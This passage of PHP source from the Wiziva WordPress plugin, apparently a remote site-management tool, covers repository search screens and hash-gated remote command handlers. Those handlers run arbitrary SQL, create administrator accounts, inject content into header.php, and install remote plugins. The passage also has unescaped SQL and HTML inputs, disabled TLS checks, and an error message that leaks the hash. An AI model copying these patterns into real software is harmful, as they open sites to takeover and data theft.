						if ( $status['url'] ) $action_links[] = '<a class="install-now button" href="' . $status['url'] . '" aria-label="' . esc_attr( sprintf( __( 'Install %s now' ), $name ) ) . '">' . __( 'Install Now' ) . '</a>';
					break;
					case 'update_available':
						if ( $status['url'] ) $action_links[] = '<a class="button" href="' . $status['url'] . '" aria-label="' . esc_attr( sprintf( __( 'Update %s now' ), $name ) ) . '">' . __( 'Update Now' ) . '</a>';
					break;
					case 'latest_installed':
					case 'newer_installed':
						$action_links[] = '<span class="button button-disabled" title="' . esc_attr__( 'This plugin is already installed and is up to date' ) . ' ">' . _x( 'Installed', 'plugin' ) . '</span>';
					break;
				}
			}
			if (in_array($plugin['slug'], $userslugs)) $action_links[] = '<span style="background: yellow;">&nbsp;In Wiziva&nbsp;</span>';
			else $action_links[] = "<span id='status-$plugin[slug]'><input type='button' class='button-secondary' value='Add to Wiziva' onclick=\"AjaxLoading();AjaxAction('imprepo&ptype=plugin&slug=$plugin[slug]');\" /></span>";
			if ($action_links) $action_links = '<ul class="plugin-action-buttons"><li>' . implode( '</li><li>', $action_links ) . '</li></ul>';
			else $action_links = '';
			$author = wp_kses( $plugin['author'], $plugins_allowedtags );
			if (!empty($author)) $author = ' <cite>' . sprintf(__('By %s'), $author) . '</cite>';
			$description = strip_tags( $plugin['short_description'] );
			$numrate = number_format_i18n( $plugin['num_ratings'] );
			$lastupd = '<strong>' . __( 'Last Updated:' ) . '</strong> <span title="' . esc_attr($plugin['last_updated']). '">' . sprintf(__('%s ago'), human_time_diff(strtotime($plugin['last_updated']))) . '</span>';
			$numdown = sprintf( _n( '%s download', '%s downloads', $plugin['downloaded'] ), number_format_i18n( $plugin['downloaded'] ) );
			if ( ! empty( $plugin['tested'] ) && version_compare( substr( $GLOBALS['wp_version'], 0, strlen( $plugin['tested'] ) ), $plugin['tested'], '>' ) ) 
				$compat = '<span class="compatibility-untested">' . __( '<strong>Untested</strong> with your version of WordPress' ) . '</span>';
			elseif ( ! empty( $plugin['requires'] ) && version_compare( substr( $GLOBALS['wp_version'], 0, strlen( $plugin['requires'] ) ), $plugin['requires'], '<' ) ) 
				$compat = '<span class="compatibility-incompatible">' . __( '<strong>Incompatible</strong> with your version of WordPress' ) . '</span>';
			else $compat = '<span class="compatibility-compatible">' . __( '<strong>Compatible</strong> with your version of WordPress' ) . '</span>';
			echo "
				<div class=\"plugin-card\">
					<div class=\"plugin-card-top\">
						<a href=\"$details_link\" class=\"thickbox plugin-icon\"><img src=\"$plugin_icon_url\" /></a>
						<div class=\"name column-name\">
							<h4><a href=\"$details_link\" class=\"thickbox\">$title</a></h4>
						</div>
						<div class=\"action-links\">$action_links</div>
						<div class=\"desc column-description\">
							<p>$description</p>
							<p class=\"authors\">$author</p>
						</div>
					</div>
					<div class=\"plugin-card-bottom\">
						<div class=\"vers column-rating\">
			";
			wp_star_rating( array( 'rating' => $plugin['rating'], 'type' => 'percent', 'number' => $plugin['num_ratings'] ) );
			echo "
							<span class=\"num-ratings\">$numrate</span>
						</div>
						<div class=\"column-updated\">$lastupd</div>
						<div class=\"column-downloaded\">
							$numdown
						</div>
						<div class=\"column-compatibility\">
							$compat
						</div>
					</div>
				</div>
			";
		}
		echo '</div>';
		echo $this->Footer();
	}


	function SearchRepoThemes() {
		global $wpdb;
		if (!isset($_GET['kw'])) $_GET['kw'] = '';
		echo "
			<div class='wrap'>
				<div id='icon-edit-pages' class='icon32'></div>
				<h2>Search the Repository for Themes
					&nbsp;<a href='admin.php?page=wiziva&searchrepo=plugins' class='button add-new-h2'>Search Plugins</a>
					&nbsp;<a href='admin.php?page=wiziva' class='button add-new-h2'>Back to Dashboard</a>
				</h2><br />
				<form method='get'>
					<input type='hidden' name='page' value='wiziva' />
					<input type='hidden' name='searchrepo' value='themes' />
					<input type='text' name='kw' value='$_GET[kw]' /> <input type='submit' name='gosearch' value='Search' />
				</form><br /><br />
		";
		if (!$_GET['kw']) {
			echo '</div>';
			return '';
		}
		$args = (object)array('search'=>$_GET['kw']);
		$request = array('action'=>'query_themes', 'timeout'=>30, 'request'=>serialize($args));
		$url = 'http://api.wordpress.org/themes/info/1.0/';
		$ret = $this->httpPost($url, $request);
		$ret = unserialize($ret);
		$plugs = $ret->themes;
		$counter = 0;
		$userslugs = array();
		$res = $wpdb->get_results("SELECT reposurl FROM {$wpdb->prefix}wiziva_plugins WHERE ptype='theme'");
		foreach ($res as $k=>$obj) $userslugs[] = $this->GetBetweenTags($obj->reposurl.'/', 'themes/', '/');
		foreach ($plugs as $pinfo) {
			$pinfo = (array)$pinfo;
			$pinfo['author'] = str_replace(' href=', " target='_blank' href=", $pinfo['author']);
			$pinfo['rating'] = $this->plxRound($pinfo['rating']/20);
			$stars = round($pinfo['rating']);
			$strs = '';
			for($i=1; $i<=5; $i++) {
				if ($i>$stars) $strs .= "<div class='star star-empty'></div>";
				else $strs .= "<div class='star star-full'></div>";
			}
			$but = in_array($pinfo['slug'], $userslugs)?'<span style="background: yellow;">&nbsp;In Wiziva&nbsp;</span>':"<input type='button' class='button-secondary' onclick=\"AjaxLoading();AjaxAction('imprepo&ptype=theme&slug=$pinfo[slug]');\" value='Add to Wiziva'>";
			//$pinfo['description'] = LimitLength($pinfo['description'], 1000);
			//<p>$pinfo[description]</p>
			$numrate = number_format_i18n($pinfo['num_ratings']);
			echo "
				<div class='plugin-card'>
					<div class='plugin-card-top'>
						<div class='nametheme'><h4><a href='https://wordpress.org/themes/$pinfo[slug]' target='_blank'>$pinfo[name]</a></h4></div>
						<div class='themeauthor'> <cite>By $pinfo[author]</cite></div>
						<div class='clear'></div>
						<div class='desctheme'>
							<img src='$pinfo[screenshot_url]' style='width: 100%;' />
						</div>
					</div>
					<div class='plugin-card-bottom'>
						<div class='vers column-rating'>
			";
			wp_star_rating( array( 'rating' => $pinfo['rating'], 'type' => 'percent', 'number' => $pinfo['num_ratings'] ) );
			echo "
							<span class='num-ratings'>$numrate</span>
						</div>
						<div style='float: right;'><a href='$pinfo[preview_url]' target='_blank'>preview</a> &nbsp;&nbsp; <span id='status-$pinfo[slug]'>$but</span></div>
					</div>
				</div>
			";
			$counter++;
			if (!($counter%2)) echo "<div class='clear'></div>";
		}
		echo '</div>';
		echo $this->Footer();
	}


	function Footer() {
		return "
			<div id='loading'><img src='".Wiziva_URL."images/ajax-loader.gif' alt='loading...' /></div>
			<div id='dim' onclick=\"AjaxLoaded();\"></div>
			<div id='dialog-main' title='' style='display: none;'></div>
			<div id='basketbox' style='right: -225px;' onmouseover='ShowBasket();' onmouseout='HideBasket();'>
				<a href='#' onclick=\"AjaxPop('pophelp&sub=about');\">What is Wiziva?</a>
				<a href='#' onclick=\"AjaxPop('pophelp&sub=howuse');\">How to Use</a>
			</div>
			<div id='basket' onmouseover='ShowBasket();' onmouseout='HideBasket();'></div>
		";
	}



	function GetUserIP() {
	  if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
	  elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
	  else return $_SERVER['REMOTE_ADDR'];
	}

	function ExecCommandOnline() {
		global $wpdb;
		if (!isset($_GET['hash']) || (urldecode($_GET['hash']) != get_settings('wiziva_hash'))) die("<errno>1</errno><err>Invalid Hash! Can not establish connection with the site!</err>");
		$ret = '';
		switch ($_GET['wipa_cmd2']) {
			case 'listposts':
				$res = $wpdb->get_results("SELECT * FROM {$wpdb->prefix}posts WHERE (post_status='publish') AND (ID>$_GET[lpid])");
				$ret = ''; $ret2 = '';
				foreach ($res as $post) {
					$url = get_permalink($post->ID);
					$ret .= "<post><id>$post->ID</id><type>$post->post_type</type><title>$post->post_title</title><pdate>$post->post_date</pdate><url>$url</url><numcomm>$post->comment_count</numcomm></post>";
					//if (!isset($arr_comms[$post->ID]) || ($arr_comms[$post->ID] != $post->comment_count)) $ret2 .= "<comm><id>$post->ID</id><numcomm>$post->comment_count</numcomm></comm>";
				}
				$ret = "<posts>$ret</posts><comms>$ret2</comms><ok>1</ok>";
			break;
			case 'delpost':
				if (wp_delete_post($_GET['postid'], 0)) $ret = "<ok>1</ok>";
			break;
			case 'listcomms':
				$res = $wpdb->get_results("SELECT * FROM {$wpdb->prefix}comments WHERE (comment_ID>$_GET[lcid])");
				$ret = '';
				foreach ($res as $comm) {
					$ret .= "<comm><id>$comm->comment_ID</id><postid>$comm->comment_post_ID</postid><content>$comm->comment_content</content><author>$comm->comment_author</author><aemail>$comm->comment_author_email</aemail><aurl>$comm->comment_author_url</aurl><aip>$comm->comment_author_IP</aip><parid>$comm->comment_parent</parid><appr>$comm->comment_approved</appr><ctime>$comm->comment_date</ctime><buserid>$comm->user_id</buserid></comm>";
				}
				$ret = "<comms>$ret</comms><ok>1</ok>";
			break;
			case 'delcomm':
				if (wp_delete_comment($_GET['commid'])) $ret = "<ok>1</ok>";
			break;
		}
		die($ret);
	}


	function ExecCommand() {
		global $wpdb;
		/*
		if ($_GET['pluginver'] != Wiziva_PLUGIN_VERSION) {
			$this->AutoUpdate();
			//die('<errno>1</errno><err>The Wiziva Plugin needed an update! Please run the last operation again!</err>');
		}
		*/
		//http://test1.webily.com/?wipa_cmd=listplugins&pluginver=1.0&hash=666ba13ff05355
		//error_reporting(E_ALL);
		//$_POST['request'] = "<request><action><op>installplugin</op><wpurl>http://test1.webily.com/</wpurl><download>http://downloads.wordpress.org/plugin/google-maps-for-wordpress.1.0.3.zip</download><name>Google Maps for WordPress</name><wpuser>admin</wpuser><wppass>admin</wppass><activate>1</activate><wppass>admin</wppass></action></request>";
		$ret = '';
		if (!isset($_GET['hash']) || (urldecode($_GET['hash']) != get_settings('wiziva_hash'))) die("<errno>1</errno><err>Invalid Hash! Can not establish connection with the site ($_GET[hash]-".get_settings('wiziva_hash').')!</err>');
		if (($_GET['wipa_cmd'] == 'request') && isset($_POST['request'])) $this->OpRequest();
		foreach ($_POST as $k=>$v) $_POST[$k] = stripslashes($v);
		switch ($_GET['wipa_cmd']) {
			case 'headinsert':
				$put = $_POST['content'];
				$fn = get_template_directory().'/header.php';
				$fh = fopen($fn, 'rb');
				$content = fread($fh, filesize($fn));
				fclose($fh);
				$content = str_replace('</head>', $put."\n</head>", $content);
				$fh = fopen($fn, 'wb');
				fwrite($fh, $content);
				fclose($fh);
				die("<ok>1</ok><p>$fn</p>");
			break;
			case 'remauth': //remove temporary admin account
				if(!function_exists('wp_delete_user')) include(ABSPATH."wp-admin/includes/user.php");
				wp_delete_user($_GET['uid']);
				die("<ok>1</ok>");
			break;
			case 'auth': //create temporary admin account
				$userdata = array(
					'user_login' => 'wipa'.$this->generate_password(6, 'alpha'),
					'user_pass' => $this->generate_password(10),
					'role'  => 'administrator'
				);
				$user_id = wp_insert_user($userdata);
				if (is_wp_error($user_id)) die('<errno>2</errno><err>Can not create admin account!</err>'.$user_id->get_error_message());
				else die("<ok>1</ok><u>$userdata[user_login]</u><p>$userdata[user_pass]</p><i>$user_id</i>");
			break;
			case 'tb-listposts':
				$res = $wpdb->get_results("SELECT * FROM {$wpdb->prefix}posts WHERE (post_status='publish') AND (ID>$_GET[lpid])");
				$ret = ''; $ret2 = '';
				foreach ($res as $post) {
					$locsize = strlen($post->post_content) + strlen($post->post_title);
					if (!isset($arr_sizes[$post->ID]) || ($arr_sizes[$post->ID] != $locsize)) {
						$url = get_permalink($post->ID);
						$ret .= "<post><id>$post->ID</id><type>$post->post_type</type><title>$post->post_title</title><url>$url</url><numcomm>$post->comment_count</numcomm><csize>$locsize</csize></post>";
					}
					if (!isset($arr_comms[$post->ID]) || ($arr_comms[$post->ID] != $post->comment_count)) $ret2 .= "<comm><id>$post->ID</id><numcomm>$post->comment_count</numcomm></comm>";
				}
				$ret = "<posts>$ret</posts><comms>$ret2</comms><ok>1</ok>";
			break;
			case 'inscomm':
				$uerid = $_POST['userid'];
				if (user_can($uerid, 'moderate_comments')) {
					$user = get_userdata($uerid);
					$time = current_time('mysql');
					$data = array(
						'comment_post_ID' => $_POST['postid'],
						'comment_author' => $user->display_name,
						'comment_author_email' => $user->user_email,
						'comment_author_url' => get_author_posts_url($uerid, $user->nickname),
						'comment_content' => urldecode($_POST['content']),
						'comment_type' => '',
						'comment_parent' => $_POST['parentid'],
						'user_id' => $uerid,
						'comment_author_IP' => $this->GetUserIP(),
						'comment_agent' => $_SERVER['HTTP_USER_AGENT'],
						'comment_date' => $time,
						'comment_approved' => 1,
					);
					wp_insert_comment($data);
					$ret = "<ok>1</ok>";
				}
				else die('<errno>1</errno><err>This user dosen\'t have the rights to add comments!</err>');
			break;
			case 'commusers':
				$ret = '';
				$arrusers = $wpdb->get_col("SELECT $wpdb->users.ID FROM $wpdb->users ORDER BY user_nicename ASC");
				foreach ($arrusers as $uerid) {
					if (user_can($uerid, 'moderate_comments')) {
						$user = get_userdata($uerid);
						$ret .= "<user><id>$uerid</id><name>$user->display_name</name><nick>$user->display_name</nick></user>";
						//print_r($user);
					}
				}
				$ret = "<users>$ret</users><ok>1</ok>";
			break;
			case 'commblock':
				$arrblocked = explode("\n", get_settings('blacklist_keys'));
				if (!in_array($_POST['bs'], $arrblocked)) $arrblocked[] = $_POST['bs'];
				update_option('blacklist_keys', implode("\n", $arrblocked));
				$ret = "<ok>1</ok>";
			break;
			case 'delcomm':
				$wpdb->query("DELETE FROM {$wpdb->prefix}comments WHERE comment_ID=$_POST[id]");
				$ret = "<ok>1</ok>";
			break;
			case 'apprcomm': 
				$wpdb->query("UPDATE {$wpdb->prefix}comments SET comment_approved=1 WHERE comment_ID=$_POST[id]");
				$ret = "<ok>1</ok>";
			break;
			case 'listcomms': 
				$res = $wpdb->get_results("SELECT * FROM {$wpdb->prefix}comments WHERE (comment_ID>$_POST[lastid]) AND (comment_post_ID=$_POST[postid])");
				$ret = '';
				foreach ($res as $comm) {
					$appr = ($comm->comment_approved==1)?'Y':'N';
					$ret .= "<comm><id>$comm->comment_ID</id><appr>$appr</appr><cont>$comm->comment_content</cont><auth>$comm->comment_author</auth><email>$comm->comment_author_email</email><url>$comm->comment_author_url</url><ip>$comm->comment_author_IP</ip><date>$comm->comment_date</date></comm>";
				}
				$ret = "<comms>$ret</comms><ok>1</ok>";
			break;
			case 'listposts': 
				$arr_sizes = array();
				$existing = explode('|', $_POST['posts']);
				foreach ($existing as $v) {
					if (!trim($v)) continue;
					$v = explode('=', $v);
					if (count($v) < 2) continue;
					$arr_sizes[$v[0]] = $v[1];
				}
				$arr_comms = array();
				$numcomms = explode('|', $_POST['comms']);
				foreach ($numcomms as $v) {
					if (!trim($v)) continue;
					$v = explode('=', $v);
					if (count($v) < 2) continue;
					$arr_comms[$v[0]] = $v[1];
				}
				$res = $wpdb->get_results("SELECT * FROM {$wpdb->prefix}posts WHERE post_status='publish'");
				$ret = ''; $ret2 = '';
				foreach ($res as $post) {
					$locsize = strlen($post->post_content) + strlen($post->post_title);
					if (!isset($arr_sizes[$post->ID]) || ($arr_sizes[$post->ID] != $locsize)) {
						$url = get_permalink($post->ID);
						$ret .= "<post><id>$post->ID</id><type>$post->post_type</type><title>$post->post_title</title><url>$url</url><numcomm>$post->comment_count</numcomm><csize>$locsize</csize></post>";
					}
					if (!isset($arr_comms[$post->ID]) || ($arr_comms[$post->ID] != $post->comment_count)) $ret2 .= "<comm><id>$post->ID</id><numcomm>$post->comment_count</numcomm></comm>";
				}
				$ret = "<posts>$ret</posts><comms>$ret2</comms><ok>1</ok>";
			break;
			case 'delplugins':
				$arr = explode('|', $_GET['dirs']);
				$wpdir = $this->getWPDir().'wp-content/plugins/';
				foreach ($arr as $dir) $this->rrmdir($wpdir.$dir);
				$ret = "<ok>1</ok>";
			break;
			case 'listplugins':
				$ret = '';
				$act = get_option('active_plugins');
				$wpdir = $this->getWPDir().'wp-content/plugins/';
				$dirs = $this->ListFiles($wpdir);
				foreach ($dirs as $dir) {
					if (is_dir($wpdir.$dir)) {
						$files = $this->ListFiles($wpdir.$dir.'/');
						foreach($files as $file) {
							if (strpos($file, '.php')) {
								if (strpos($dir.'/'.$file, 'wiziva/class.main.php')) continue;
								$active = in_array($dir.'/'.$file, $act)?1:0;
								$content = implode('', file($wpdir.$dir.'/'.$file));
								$pos1 = strpos($content, '/*');
								$pos2 = strpos($content, 'Plugin Name:');
								if (($pos1 < $pos2) && ($pos2 < 200)) {
									$ret .= '<plugin>';
									$ret .= '<n>'.$this->GetBetweenTags($content, 'Plugin Name:', "\n").'</n>';
									$ret .= '<v>'.$this->GetBetweenTags($content, 'Version:', "\n").'</v>';
									$ret .= '<u>'.$this->GetBetweenTags($content, 'Plugin URI:', "\n").'</u>';
									$ret .= '<a>'.$this->GetBetweenTags($content, 'Author:', "\n").'</a>';
									$ret .= '<au>'.$this->GetBetweenTags($content, 'Author URI:', "\n").'</au>';
									$ret .= '<l>'.$this->GetBetweenTags($content, 'License:', "\n").'</l>';
									$ret .= '<lu>'.$this->GetBetweenTags($content, 'License URI:', "\n").'</lu>';
									$ret .= '<d>'.$this->GetBetweenTags($content, 'Description:', "\n").'</d>';
									$ret .= '<di>'.$dir.'</di>';
									$ret .= '<ac>'.$active.'</ac>';
									$ret .= '<t>'.$this->GetBetweenTags($content, 'Tags:', "\n").'</t>';
									$ret .= '</plugin>';
								}
							}
						}
					}
				}
			break;
			case 'listthemes':
				$ret = '';
				$wpdir = $this->getWPDir().'wp-content/themes/';
				$dirs = $this->ListFiles($wpdir);
				foreach ($dirs as $dir) {
					if (is_dir($wpdir.$dir)) {
						$files = $this->ListFiles($wpdir.$dir.'/');
						foreach($files as $file) {
							if ($file == 'style.css') {
								$content = implode('', file($wpdir.$dir.'/'.$file));
								if (strpos($content, 'Theme Name:')) {
									$ret .= '<theme>';
									$ret .= '<n>'.$this->GetBetweenTags($content, 'Theme Name:', "\n").'</n>';
									$ret .= '<v>'.$this->GetBetweenTags($content, 'Version:', "\n").'</v>';
									$ret .= '<u>'.$this->GetBetweenTags($content, 'Theme URI:', "\n").'</u>';
									$ret .= '<a>'.$this->GetBetweenTags($content, 'Author:', "\n").'</a>';
									$ret .= '<au>'.$this->GetBetweenTags($content, 'Author URI:', "\n").'</au>';
									$ret .= '<l>'.$this->GetBetweenTags($content, 'License:', "\n").'</l>';
									$ret .= '<lu>'.$this->GetBetweenTags($content, 'License URI:', "\n").'</lu>';
									$ret .= '<d>'.$this->GetBetweenTags($content, 'Description:', "\n").'</d>';
									$ret .= '<t>'.$this->GetBetweenTags($content, 'Tags:', "\n").'</t>';
									$ret .= '<di>'.$dir.'</di>';
									$ret .= '</theme>';
								}
							}
						}
					}
				}
			break;
			case 'sql':
				$q = stripslashes($_POST['query']);
				$q = str_replace('[prefix]', $wpdb->prefix, $q);
				$res = $wpdb->query($q);
				$err = mysql_error();
				if ($err) die('sql error: '.$err.' --- '.$q);
				else die('ok');
			break;
			case 'wpoption':
				//$_POST['value'] = stripslashes(stripslashes($_POST['value']));
				//if ($_POST['name']) update_option($_POST['name'], $_POST['value']);
				$wpdb->query("UPDATE {$wpdb->prefix}options SET option_value='$_POST[value]', autoload='yes' WHERE option_name='$_POST[name]'");
				die('ok');
			break;
		}
		die($ret);
	}
	

	function ShowTinyMCE() {
		wp_enqueue_script('common');
		wp_enqueue_script('jquery-color');
		wp_print_scripts('editor');
		if (function_exists('add_thickbox')) add_thickbox();
		wp_print_scripts('media-upload');
		if (function_exists('wp_tiny_mce')) wp_tiny_mce();
		wp_admin_css();
		wp_enqueue_script('utils');
		do_action("admin_print_styles-post-php");
		do_action('admin_print_styles');
	}

	function htmlEditor() {
		/*
			$_POST['content'] = 'sss';
			add_filter('admin_head', array($this, 'ShowTinyMCE'));
			the_editor($_POST['content'], 'content');
		echo "
			<div style='display: none;'>
		";
		*/
	}


	function ListFiles($dir) {
		$arr = array();
	    $objects = scandir($dir); 
		foreach ($objects as $object) if ($object != "." && $object != "..") $arr[] = $object;
		return $arr;
	}


	function getWPDir() {
		return str_replace('index.php', '', $_SERVER['SCRIPT_FILENAME']);
	}


	function OpRequest() {
		global $wpdb;
		$requeststr = $this->GetBetweenTags($_POST['request'], '<request>', '</request>');
		if (strpos($requeststr, '</cpuser>')) {
			$cpanel_user = $this->GetBetweenTags($_POST['request'], '<cpuser>', '</cpuser>');
			$cpanel_password = $this->GetBetweenTags($_POST['request'], '<cppass>', '</cppass>');
			$cpanel_host = strtolower($this->GetBetweenTags($_POST['request'], '<cpdom>', '</cpdom>'));
			$cpanel_skin = $this->GetBetweenTags($_POST['request'], '<cptheme>', '</cptheme>');
		}
		if (strpos($requeststr, '</wpurl>')) $wp_url = $this->GetBetweenTags($_POST['request'], '<wpurl>', '</wpurl>');
		if (strpos($requeststr, '</wpuser>')) {
			$wp_user = $this->GetBetweenTags($_POST['request'], '<wpuser>', '</wpuser>');
			$wp_pass = $this->GetBetweenTags($_POST['request'], '<wppass>', '</wppass>');
		}
		else {
		}
		$actions = explode('</action>', $requeststr);
		$ret = '';
		foreach ($actions as $action) {
			$op = $this->GetBetweenTags($action, '<op>', '</op>');
			if ($op == 'importpost') {
				$ptime = $this->GetBetweenTags($action, '<ptime>', '</ptime>');
				if ($ptime > time()) $status = 'future';
				else $status = 'publish';
				$ptime = date('Y-m-d H:i:s', $ptime);
				$author = $this->GetBetweenTags($action, '<author>', '</author>');
				$author = $wpdb->get_var("SELECT ID FROM {$wpdb->prefix}users WHERE (user_nicename='$author') OR (display_name='$author')");
				if (!$author) $author = 0;
				$post = array(
					'ID' => 0,
					'post_content' => htmlspecialchars_decode($this->GetBetweenTags($action, '<content>', '</content>')),
					'post_title' => $this->GetBetweenTags($action, '<title>', '</title>'),
					'post_name' => $this->GetBetweenTags($action, '<slug>', '</slug>'),
					'post_status' => $status,
					'post_author' => $author,
					'post_type' => $this->GetBetweenTags($action, '<type>', '</type>'),
					'post_date' => $ptime
				);  
				$post_id = wp_insert_post($post);
				if ($post_id) die("<ok>$post_id</ok>");
				else die("<err>err</err>");
			}
			if ($op == 'installtheme') {
				chdir('wp-content/themes/');
				if (strpos($action, '<zipfname>')) $zipfname = $this->GetBetweenTags($action, '<zipfname>', '</zipfname>');
				elseif (strpos($action, '<download>')) {
					$stub = $this->GetBetweenTags($action, '<download>', '</download>');
					if (strpos($stub, 'dpr.php')) {
						$zipfname = $this->GetBetweenTags($action, '<name>', '</name>');
						$zipfname = strtolower(str_replace(' ', '_', $zipfname));
						$zipfname = str_replace('/', '_', $zipfname).'.zip';
						$stub .= '&h='.get_settings('wiziva_hash');
					}
					else $zipfname = substr($stub, strrpos($stub, '/')+1);
					if (!$this->DownloadFile($stub, $zipfname)) die("<installtheme><errno>101</errno><err>Failed to download theme!</err></installtheme>");
				}
				$activate = strpos($action, '</activate>')?$this->GetBetweenTags($action, '<activate>', '</activate>'):0;
				$themename = $this->GetBetweenTags($action, '<name>', '</name>');
				$this->unzip($zipfname);
				@unlink($zipfname);
				//??? activate theme
				die("<installtheme><ok>1</ok></installtheme>");
			}
			if ($op == 'installplugin') {
				chdir('wp-content/plugins/');
				if (strpos($action, '<zipfname>')) $zipfname = $this->GetBetweenTags($action, '<zipfname>', '</zipfname>');
				elseif (strpos($action, '<download>')) {
					$stub = urldecode($this->GetBetweenTags($action, '<download>', '</download>'));
					if (strpos($stub, 'dpr.php')) {
						$zipfname = $this->GetBetweenTags($action, '<name>', '</name>');
						$zipfname = strtolower(str_replace(' ', '_', $zipfname));
						$zipfname = str_replace('/', '_', $zipfname).'.zip';
						$stub .= '&h='.get_settings('wiziva_hash');
					}
					else $zipfname = substr($stub, strrpos($stub, '/')+1);
					if (!$this->DownloadFile($stub, $zipfname)) die("<installplugin><errno>101</errno><err>Failed to download plugin ($stub, $zipfname)!</err></installplugin>");
				}
				$this->unzip($zipfname);
				@unlink($zipfname);
				$activate = strpos($action, '</activate>')?$this->GetBetweenTags($action, '<activate>', '</activate>'):1;
				if ($activate) {
					$pluginname = trim($this->GetBetweenTags($action, '<name>', '</name>'));
					$plugfile = $this->get_plugin_file($pluginname);
					require_once(ABSPATH .'/wp-admin/includes/plugin.php');
					$result = activate_plugin($plugfile);
					//if (is_wp_error($result)) die("<installplugin><errno>3</errno><err>Failed to activate plugin!</err></installplugin>");
				}
				die("<installplugin><ok>1</ok></installplugin>");
			}
		}
		echo $ret;
		die();
	}


	function GetBetweenTags($content, $tag1, $tag2) {
		if (!$content) return '';
		$pos1 = strpos($content, $tag1)+strlen($tag1);
		if (!$pos1) return '';
		$pos2 = @strpos($content, $tag2, $pos1);
		if (!$pos2) return '';
		$content = substr($content, $pos1, $pos2-$pos1);
		return $content;
	}


	function unzip($zipfile, $passfolder='') {
		$rootd = '';
		$memdir = getcwd();
		$dirs = array();
		$zip = zip_open($zipfile);
		if (!$zip) return false;
		while ($zip_entry = zip_read($zip))    {
			@zip_entry_open($zip, $zip_entry);
			if (substr(zip_entry_name($zip_entry), -1) != '/') {
				$name = zip_entry_name($zip_entry);
				if ($rootd && file_exists($name)) continue;
				if ($passfolder && (substr($name, 0, strlen($passfolder)+1) == $passfolder.'/')) $name = substr($name, strlen($passfolder)+1, strlen($name)-strlen($passfolder)-1);
				if (strpos($name, '/')) {
					$curdir = substr($name, 0, strrpos($name, '/'));
					if (!in_array($curdir, $dirs)) {
						$stub = explode('/', $name);
						if (!$rootd) $rootd = $stub[0];
						if (file_exists($name)) continue;
						$fldr = '';
						for ($i=0; $i<count($stub)-1; $i++) {
							$fldr .= $stub[$i];
							if (!in_array($fldr, $dirs)) {
								$dirs[] = $fldr;
								@mkdir($fldr);
							}
							$fldr .= '/';
						}
						$dirs[] = $curdir;
					}
				}
				$fopen = @fopen($name, 'wb');
				@fwrite($fopen, zip_entry_read($zip_entry, zip_entry_filesize($zip_entry)), zip_entry_filesize($zip_entry));
			}
			@zip_entry_close($zip_entry);
		}
		zip_close($zip);
		chdir($memdir);
		return $rootd;
	}




	 function rrmdir($dir) { 
	   if (is_dir($dir)) { 
		 $objects = scandir($dir); 
		 foreach ($objects as $object) { 
		   if ($object != "." && $object != "..") { 
			 if (filetype($dir."/".$object) == "dir") $this->rrmdir($dir."/".$object); else unlink($dir."/".$object); 
		   } 
		 } 
		 reset($objects); 
		 rmdir($dir); 
	   } 
	 } 


	function WPAction($url, $fields=array()) {
		global $lasturl;
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		$header[0] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
		$header[] = "Accept-Encoding: gzip,deflate";
		$header[] = "Cache-Control: max-age=0";
		$header[] = "Accept-Language: en-gb,en;q=0.5";
		$header[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
		$header[] = "Keep-Alive: 300";
		$header[] = "Connection: keep-alive";
		curl_setopt($ch, CURLOPT_USERAGENT, '	Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3');
		curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
		curl_setopt($ch, CURLOPT_REFERER, $lasturl);
		$lasturl = $url;
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip,deflate');
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
		curl_setopt($ch, CURLOPT_TIMEOUT, 20);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
		curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		if (count($fields)) {
			curl_setopt($ch, CURLOPT_POST, count($fields));
			$fields_string = '';
			foreach($fields as $key=>$value) $fields_string .= $key.'='.$value.'&';
			rtrim($fields_string,'&');
			curl_setopt($ch, CURLOPT_POSTFIELDS, $fields_string);
		}
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		$return = curl_exec($ch);
		curl_close($ch); 
		return $return;
	}



	function Settings() {
		$msg = '';
		if (isset($_POST['docreateacc'])) {
			$url = urlencode(get_site_url());
			$create = file_get_contents(Wiziva_API_URL."/api.php?op=addacclink&username=$_POST[username]&email=$_POST[email]&wpurl=$url");
			if (strpos(' '.$create, '<ok>1</ok>') && strpos($create, '<hash>')) {
				update_option('wiziva_hash', $this->GetBetweenTags($create, '<hash>', '</hash>'));
				$msg = "<div style='color: green; font-weight: bold; padding: 10px;'>Your Wiziva.com account has been created and linked with this WordPress installation!<br />Please check your email ($_POST[email]) for your login details for Wiziva.com!</div>";
			}
			else $msg = "<div style='color: red; font-weight: bold; padding: 10px;'>".$this->GetBetweenTags($create, '<errmsg>', '</errmsg>')."</div>";
		}
		if (isset($_POST['dolink'])) {
			$url = urlencode(get_site_url());
			$create = file_get_contents(Wiziva_API_URL."/api.php?op=linksite&email=$_POST[email]&pass=$_POST[pass]&wpurl=$url");
			if (strpos(' '.$create, '<ok>1</ok>') && strpos($create, '<hash>')) {
				update_option('wiziva_hash', $this->GetBetweenTags($create, '<hash>', '</hash>'));
				$msg = "<div style='color: green; font-weight: bold; padding: 10px;'>Your Wiziva.com account is now linked with this WordPress installation!</div>";
			}
			else $msg = "<div style='color: red; font-weight: bold; padding: 10px;'>".$this->GetBetweenTags($create, '<errmsg>', '</errmsg>')."</div>";
		}
		if (isset($_POST['dosettings'])) {
			update_option('wiziva_hash', $_POST['hash']);
			$msg = "<div style='color: green; font-weight: bold; padding: 10px;'>Security hash saved!<br />Please make sure you also update it in your Wiziva.com control panel!</div>";
		}
		if (isset($_GET['newcode'])) $val = $this->generate_password(10);
		else $val = get_settings('wiziva_hash');
		$user = wp_get_current_user();
		$autolink = '';
		$autonote = '';
		if (!$val) {
